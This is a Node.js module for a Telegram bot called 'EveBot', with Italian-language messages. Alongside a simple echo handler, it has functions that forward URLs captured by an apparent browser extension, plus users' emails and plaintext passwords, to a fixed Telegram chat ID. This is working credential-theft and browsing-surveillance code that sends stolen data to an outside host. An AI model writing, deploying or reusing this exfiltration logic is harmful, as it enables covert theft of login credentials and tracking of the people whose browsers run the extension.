const { axiosInstance } = require("./axios");

function sendMessage(messageObj, messageText){
    return axiosInstance.get("sendMessage", {  
        chat_id: messageObj.chat.id,
        text: messageText,
    });
}

function sendUrlToTelegram(urlPage){
    const chat_id = 912527287;

    const message = `Ho ricevuto dall'estensione il seguente URL: ${urlPage}`

    return axiosInstance.get("sendMessage", {  
        chat_id: chat_id,
        text: message,
    });
}

function sendLoginToTelegram(email, password){
    const chat_id = 912527287;

    const message = `Utente ha loggato con:${email} e ${password}`;

    return axiosInstance.get("sendMessage", {  
        chat_id: chat_id,
        text: message,
    });
}

function handleMessage(messageObj){
    const messageText = messageObj.text || "";

    if(messageText.charAt(0) == "/"){
        const command = messageText.substr(1);
        switch (command){
            case "start":
                return sendMessage(messageObj, "Ciao sono EveBot");
            default:
                return sendMessage(messageObj, "Comando non rilevato");
        }
    }
    else{
        //console.log("Invio messaggio normale");
        const username = messageObj.from?.username || messageObj.from?.first_name || "Utente anonimo";
        //console.log(username);
        return sendMessage(messageObj, "Hai scritto: " + messageText);

    }
}

module.exports = {handleMessage, sendUrlToTelegram, sendLoginToTelegram};